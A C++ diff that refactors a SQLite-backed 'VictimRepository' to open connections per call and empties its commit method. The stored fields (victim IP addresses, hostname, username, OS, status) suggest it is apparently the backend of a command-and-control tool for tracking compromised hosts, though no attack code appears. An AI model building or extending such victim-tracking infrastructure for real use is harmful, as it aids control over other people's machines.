@@ -10,8 +10,8 @@
 //--------------------------------
 //
 //--------------------------------
-VictimRepository::VictimRepository(const std::string& db_path)
-    : db_(std::make_unique<Database>(db_path)) {
+VictimRepository::VictimRepository(const std::string& db_path) {
+    set_db_path(db_path);
     ensure_table();
 }
 
@@ -19,7 +19,9 @@ VictimRepository::VictimRepository(const std::string& db_path)
 //
 //--------------------------------
 void VictimRepository::ensure_table() {
-    db_->exec(R"(
+    auto db = open_readwrite();
+
+    db.exec(R"(
         CREATE TABLE IF NOT EXISTS victims (
             victim_id INTEGER PRIMARY KEY AUTOINCREMENT,
             victim_uid TEXT UNIQUE NOT NULL,
@@ -38,8 +40,10 @@ void VictimRepository::ensure_table() {
 //
 //--------------------------------
 std::vector<VictimDAO> VictimRepository::list() const {
+    auto db = open_readwrite();
+
     std::vector<VictimDAO> results;
-    sqlite3* h = db_->handle();
+    sqlite3* h = db.getHandle();
     sqlite3_stmt* stmt = nullptr;
 
     const char* sql = "SELECT victim_id, victim_uid, internal_ip, external_ip, hostname, "
@@ -88,8 +92,10 @@ std::vector<VictimDAO> VictimRepository::list() const {
 //
 //--------------------------------
 std::optional<VictimDAO> VictimRepository::get(int64_t id) const {
+    auto db = open_readonly();
+
     std::optional<VictimDAO> opt;
-    sqlite3* h = db_->handle();
+    sqlite3* h = db.getHandle();
     sqlite3_stmt* stmt = nullptr;
     const char* sql = "SELECT victim_id, victim_uid, internal_ip, external_ip, hostname, "
                       "username, operating_system, last_update, status "
@@ -123,8 +129,10 @@ std::optional<VictimDAO> VictimRepository::get(int64_t id) const {
 //
 //--------------------------------
 std::optional<VictimDAO> VictimRepository::get(const UUID& uid) const {
+    auto db = open_readonly();
+
     std::optional<VictimDAO> opt;
-    sqlite3* h = db_->handle();
+    sqlite3* h = db.getHandle();
     sqlite3_stmt* stmt = nullptr;
     const char* sql = "SELECT victim_id, victim_uid, internal_ip, external_ip, hostname, "
                       "username, operating_system, last_update, status "
@@ -158,7 +166,9 @@ std::optional<VictimDAO> VictimRepository::get(const UUID& uid) const {
 //
 //--------------------------------
 VictimDAO VictimRepository::create(const VictimDAO& victim) {
-    sqlite3* h = db_->handle();
+    auto db = open_readwrite();
+
+    sqlite3* h = db.getHandle();
     sqlite3_stmt* stmt = nullptr;
     const char* sql = "INSERT INTO victims (victim_uid, internal_ip, external_ip, hostname, "
                       "username, operating_system, last_update, status) "
@@ -197,7 +207,9 @@ VictimDAO VictimRepository::create(const VictimDAO& victim) {
 //
 //--------------------------------
 std::optional<VictimDAO> VictimRepository::update(int64_t id, const VictimDAO& victim) {
-    sqlite3* h = db_->handle();
+    auto db = open_readwrite();
+
+    sqlite3* h = db.getHandle();
     sqlite3_stmt* stmt = nullptr;
     const char* sql = "UPDATE victims SET internal_ip = ?, external_ip = ?, hostname = ?, "
                       "username = ?, operating_system = ?, last_update = ?, status = ? "
@@ -229,7 +241,9 @@ std::optional<VictimDAO> VictimRepository::update(int64_t id, const VictimDAO& v
 //
 //--------------------------------
 bool VictimRepository::remove(int64_t id) {
-    sqlite3* h = db_->handle();
+    auto db = open_readwrite();
+
+    sqlite3* h = db.getHandle();
     sqlite3_stmt* stmt = nullptr;
     const char* sql = "DELETE FROM victims WHERE victim_id = ?;";
 
@@ -252,5 +266,4 @@ bool VictimRepository::remove(int64_t id) {
 //
 //--------------------------------
 void VictimRepository::commit() {
-    db_->commit();
 }
